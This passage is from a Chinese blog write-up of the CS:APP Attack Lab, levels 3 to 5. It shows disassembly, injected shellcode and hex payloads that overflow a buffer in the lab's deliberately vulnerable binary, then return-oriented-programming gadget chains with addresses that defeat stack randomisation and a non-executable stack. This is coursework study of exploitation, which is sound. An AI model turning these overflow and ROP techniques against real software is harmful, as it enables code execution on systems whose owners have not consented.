<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png"></p>
<p>成功，中间犯了一个小错误，将<code>push $0x4017ec</code>写成了<code>push   0x4017ec</code>,其中前者代表的是立即数，后者则代表的内存地址处的值。</p>
<h4 id="Level3："><a href="#Level3：" class="headerlink" title="Level3："></a>Level3：</h4><p>还是test调用完getbuf之后不返回test，而是执行touch3，touch3需要接收参数cookie，touch3中还调用了hexmatch函数，要传递两个参数。</p>
<p><strong>思路：</strong> 不能直接ret到touch3中，应该像上一个挑战一样，先跳转到我们的shellcode，shellcode完成参数的传递以及ret到touch3。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val,<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="type">char</span>* s=cbuf+random()%<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s,<span class="string">&quot;%.8x&quot;</span>,val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval,s,<span class="number">9</span>)==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span>* sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(hexmatch(cookie,sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        calidate(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br><span class="line">  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp    #-128</span><br><span class="line">  401854:	41 89 fc             	mov    %edi,%r12d</span><br><span class="line">  401857:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401861:	00 00 </span><br><span class="line">  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)</span><br><span class="line">  401868:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40186a:	e8 41 f5 ff ff       	call   400db0 &lt;random@plt&gt;</span><br><span class="line">  40186f:	48 89 c1             	mov    %rax,%rcx</span><br><span class="line">  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401879:	0a d7 a3 </span><br><span class="line">  40187c:	48 f7 ea             	imul   %rdx</span><br><span class="line">  40187f:	48 01 ca             	add    %rcx,%rdx</span><br><span class="line">  401882:	48 c1 fa 06          	sar    $0x6,%rdx</span><br><span class="line">  401886:	48 89 c8             	mov    %rcx,%rax</span><br><span class="line">  401889:	48 c1 f8 3f          	sar    $0x3f,%rax</span><br><span class="line">  40188d:	48 29 c2             	sub    %rax,%rdx</span><br><span class="line">  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax</span><br><span class="line">  401898:	48 c1 e0 02          	shl    $0x2,%rax</span><br><span class="line">  40189c:	48 29 c1             	sub    %rax,%rcx</span><br><span class="line">  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx</span><br><span class="line">  4018a3:	45 89 e0             	mov    %r12d,%r8d</span><br><span class="line">  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx</span><br><span class="line">  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  4018b2:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  4018b7:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4018bf:	e8 ac f5 ff ff       	call   400e70 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx</span><br><span class="line">  4018c9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">  4018cc:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  4018cf:	e8 cc f3 ff ff       	call   400ca0 &lt;strncmp@plt&gt;</span><br><span class="line">  4018d4:	85 c0                	test   %eax,%eax</span><br><span class="line">  4018d6:	0f 94 c0             	sete   %al</span><br><span class="line">  4018d9:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi</span><br><span class="line">  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi</span><br><span class="line">  4018e8:	00 00 </span><br><span class="line">  4018ea:	74 05                	je     4018f1 &lt;hexmatch+0xa5&gt;</span><br><span class="line">  4018ec:	e8 ef f3 ff ff       	call   400ce0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp</span><br><span class="line">  4018f5:	5b                   	pop    %rbx</span><br><span class="line">  4018f6:	5d                   	pop    %rbp</span><br><span class="line">  4018f7:	41 5c                	pop    %r12</span><br><span class="line">  4018f9:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx        #将rdi里的参数复制到rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi  #参数sval</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先调用touch3之前，要确保rdi中有指针，注意参数类型是char*而上一个挑战 <code>void touch2(unsigned val)</code>参数是一个无符号整型，所以这一次我们还要创建一个字符串被rdi中的指针所指。字符串是“59b997fa”，我们将字符串的ascii输入。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>字符串是以**’\0’**结尾的，其ascii是0，检测到0计算机就是到字符串结束了。我们只要将字符串的首地址放入寄存器rdi即可。题目描述中还提到<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png"></p>
<p>可以看到在调用了hexmatch之后，连续push了三次<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png"></p>
<p>所以临近返回地址的地方不要存放数据。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>所以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00 48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00 c3 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55</span><br></pre></td></tr></table></figure>

<p>注意，最后的四字节的地址不再是栈顶的位置，因为我们的字符串是存放在栈顶的，ret到栈顶程序不会向下执行，我们要ret到mov指令的地址。81&#x3D;78+9</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png"></p>
<p>失败了，猜测应该还是被hexmatch和strcmp压入的数据覆盖了，参考了一下，原来还可以将字符串放置在第44个字节后面，即test的栈帧中，因为我们不在返回test所以覆盖那里也没什么影响。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>注意不能直接跟在44字节后面，因为64位机器ret指令相当于pop八个字节，pop之后rsp+8，所以字符串要在返回地址八个字节之后.0x5561dca8&#x3D;0x5561dc78+0x2c（48字节）。</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png"></p>
<p>成功！！！</p>
<h3 id="实验部分2面向返回的编程："><a href="#实验部分2面向返回的编程：" class="headerlink" title="实验部分2面向返回的编程："></a>实验部分2面向返回的编程：</h3><p>这一部分难度增加，上一部分挑战栈既没有<strong>随机化</strong>也没有<strong>不可执行的内存标记</strong>。栈空间被标记为不可执行区域，所以我们不再能使用注入的shellcode。接下来的挑战要用到ROP ( Return-oriented Programming )即面向返回的编程。</p>
<p><strong>ROP原理：</strong>		 </p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png"></p>
<p>我们注入的内容被划分为一个个gadget，其实是一个个地址，gatcode有一个显著的特点，即最后一字节内容为c3即ret的机器码，这样一个个gatget就有ret指令连接了起来。既然栈内空间不可执行，那么这个地址要指向哪里呢？答案是程序现有的代码段，举例来说<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png"></p>
<p>这是一个函数，看起来没什么特别，也没有什么攻击性，但是转化为它的机器级表示<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png"></p>
<p>其中 <code>48 89 c7</code>是 <code>mov %rax,rdi</code>的机器码，我们只要在返回地址处填充0x400f18(起始地址400f15往后三个字节)即可执行<code>mov %rax,rdi</code>并且由ret弹出栈内的下一个地址继续操作。PDF给出了几张供我们参考攻击的表<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">                </p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png"></p>
<p>好，接下来开搞。！！！</p>
<h4 id="Level4："><a href="#Level4：" class="headerlink" title="Level4："></a>Level4：</h4><p>这个挑战和2要达到相同的目的，即test在调用完getbuf之后返回执行touch2，执行touch2之前要往%rdi中传递参数cookie。在level2中我们直接在栈中注入了<code>mov cookie，%rdi</code> 的机器码，这次挑战我们只能利用现有的代码执行。</p>
<p>分为两步，cookie在我们注入的字符串中，要通过pop指令将cookie弹到rdi中，对应的机器码是 <code>5f</code>，可惜的是在给出的gadget中并没有5f，所以我们只能先将cookie弹到一个寄存器，再将这个寄存器的值复制到%rdi中</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png"></p>
<p><code>48 89 c7</code>对应 <code>mov %rax,%rdi</code>,地址是0x4019a2</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png"></p>
<p><code>58 90 c3</code> 对应 <code>popq %rax  ; nop ; ret</code> 。地址0x4019ab。接下来就该考虑注入的顺序了。</p>
<p>touch2的地址：0x4017ec。cookie的值0x59b997fa</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png"></p>
<p>脑子抽了一直用上一个题目测试答案显示失败。。。</p>
<h4 id="Level5："><a href="#Level5：" class="headerlink" title="Level5："></a>Level5：</h4><p>使用ROP完成level3。这是shellcode实现的操作：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>

<p>首先将字符串“35 39 62 39 39 37 66 61 0a 00”入栈，然后将其首地址pop到一个寄存器，然后复制到%edi，然后调用touch3，要考虑到hexmatch和strcmp对栈的影响。由于栈随机化的原因，我们不能直接获得字符串的地址，但是可以通过<code>movl %esp,xxx</code>指令得到当前的栈顶地址，计算出字符串的地址。<strong>movl以寄存器作为目的时会把高四个字节设置为0.</strong></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png"></p>
<p>只有一个选择 <code>48 89 e0</code> 即 <code>mov %rsp,%rax</code>  (或许89 e0),栈顶地址被放入%eax中,地址0x401a07。。。思考了良久之后，我发现无解了，因为仅靠寄存器之间的mov指令和pop指令不可能增加某个寄存器的值，所以我们放入%eax中的值不能发生变化，这显然不可能。</p>
<p>看了提示之后才恍然大悟，题目并没有局限在mov，movl，popq指令之间，在提供的rop指令中存在大量的lea指令，之前学习过lea指令，加载有效地址，同时它可以进行四则混合运算，在这里我们需要他的<strong>加</strong>运算。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png"></p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png"></p>
<p>检索了全部lea相关的指令，发现只有一个能够使用（其他都是lea    -0x6fa78caf(%rdi),%eax格式，即将%rdi加上一个立即数赋值给%eax）。<code>lea （%rdi,%rsi,1）,%rax</code>的作用是rax&#x3D;rdi+rsi*1，有了这条指令的帮助我们就可以变更栈中存放的地址。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png"></p>
<p>只要按照这个思路，计算出X的值即可，实际操作过程中发现没有<code>pop %rsi</code>以及许多相关指令，最终只能用 <code>pop %rax ; mov eax,edx ; mov edx,ecx; mov ecx,esi </code>这四条指令来代替。</p>
<p><code>pop %rax;ret</code>地址：0x4019ab</p>
<p><code>mov eax,edx;ret</code>地址：0x401a42</p>
<p><code>mov edx，ecx；ret</code>地址：0x401a69</p>
<p><code>mov ecx,esi;ret</code>地址：0x401a13</p>
<p><code>mov rsp,rax</code>地址：0x401aad</p>
<p><code>mov rax,rdi</code>地址：0x4019a2</p>
<p><code>lea    (%rdi,%rsi,1),%rax</code>地址：0x4019d6</p>
<p><code>mov rax,rdi</code>地址：0x4019a2</p>
<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png"></p>
<p>通过计算，执行mov rsp，rdi的时候rsp的值是48，cookie相对它32个字节即0x20</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png"></p>
<p>over，学到了很多^_^</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/csapp/" rel="tag"># csapp</a>
              <a href="/tags/lab/" rel="tag"># lab</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/" rel="prev" title="PE文件学习篇">
      <i class="fa fa-chevron-left"></i> PE文件学习篇
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/09/10/%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/" rel="next" title="第八章-异常控制流">
      第八章-异常控制流 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E6%8A%97%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">对抗缓冲区溢出攻击：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E9%9A%8F%E6%9C%BA%E5%8C%96%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">栈随机化：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%91%E4%B8%9D%E9%9B%80%E5%80%BC-canary"><span class="nav-number">2.2.</span> <span class="nav-text">金丝雀值(canary):</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%8C%BA%E5%9F%9F%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">限制可执行代码区域：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E9%83%A8%E5%88%861%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">实验部分1代码注入攻击：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 